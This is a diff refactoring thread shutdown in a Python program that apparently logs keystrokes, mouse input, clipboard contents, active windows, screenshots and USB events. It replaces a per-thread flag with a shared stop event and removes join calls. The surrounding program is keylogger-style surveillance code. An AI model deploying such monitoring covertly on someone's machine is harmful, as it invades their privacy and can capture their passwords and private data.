@@ -193,9 +193,8 @@ def log_active_window() -> None:
 def monitor_clipboard() -> None:
     """Monitor clipboard changes and log them."""
     global clipboard_content
-    thread = threading.current_thread()
     clipboard_content = pyperclip.paste() if clipboard_available else None
-    while getattr(thread, "do_run", True):
+    while not stop_event.is_set():  # Check the shared stop event
         time.sleep(3)
         try:
             current_clipboard = pyperclip.paste()
@@ -328,7 +327,7 @@ active_window_thread.start()
 
 if clipboard_available:
     clipboard_thread = threading.Thread(target=monitor_clipboard, daemon=True)
-    setattr(clipboard_thread, "do_run", True)
+    # No need to set 'do_run' anymore
     clipboard_thread.start()
 
 screenshot_thread = threading.Thread(target=periodic_screenshot_capture, daemon=True)
@@ -339,13 +338,14 @@ usb_thread.start()
 
 # Main loop: block until listeners are stopped
 try:
+    # Wait for the non-daemon listeners to finish
     keyboard_listener.join()
     mouse_listener.join()
     key_combination_listener.join()
-    if clipboard_available:
-        clipboard_thread.join()
-    screenshot_thread.join()
-    usb_thread.join()
+
+    # Daemon threads (flush, active_window, clipboard, screenshot, usb)
+    # will exit automatically when the main thread and listeners finish.
+    # No need to explicitly join them.
 except Exception as e:
     logging.error(f"Error joining listeners: {e}")
 
